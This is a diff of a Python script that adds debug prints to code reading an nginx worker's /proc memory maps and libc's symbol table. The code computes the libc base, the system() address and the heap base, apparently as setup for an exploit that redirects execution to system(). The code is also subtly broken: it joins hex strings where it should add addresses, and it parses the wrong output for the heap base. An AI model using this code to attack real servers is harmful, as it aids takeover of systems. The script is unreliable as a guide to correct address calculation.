@@ -30,15 +30,18 @@ list_libc_base_addr = subprocess.check_output(
     )
 LIBC_BASE = re.search(rb'^([0-9a-f]+)-', list_libc_base_addr).group(1)
 LIBC_BASE = f"0x{LIBC_BASE.decode()}"
+print("LIBC BASE: ", LIBC_BASE)
 # Determine the SYSTEM_ADDR
 system_offset = subprocess.check_output(
     "readelf -sW /usr/lib/x86_64-linux-gnu/libc.so.6 | grep -E ' system(@|$)'",
     shell=True)
 system_offset = re.search(rb':\s+0*([0-9a-f]+)\s', system_offset).group(1)
+print("System Offset:", system_offset)
 SYSTEM_ADDR = LIBC_BASE + system_offset.decode()
 # Determine the HEAP_BASE
 HEAP_BASE = subprocess.check_output(f"grep '\[heap\]' /proc/{nginx_worker_process}/maps", shell=True)
 HEAP_BASE = re.search(rb'^([0-9a-f]+)-', list_libc_base_addr).group(1)
 HEAP_BASE = f"{HEAP_BASE.decode()}"
-
+print("HEAP BASE:", HEAP_BASE)
 print(LIBC_BASE, SYSTEM_ADDR, HEAP_BASE)
+
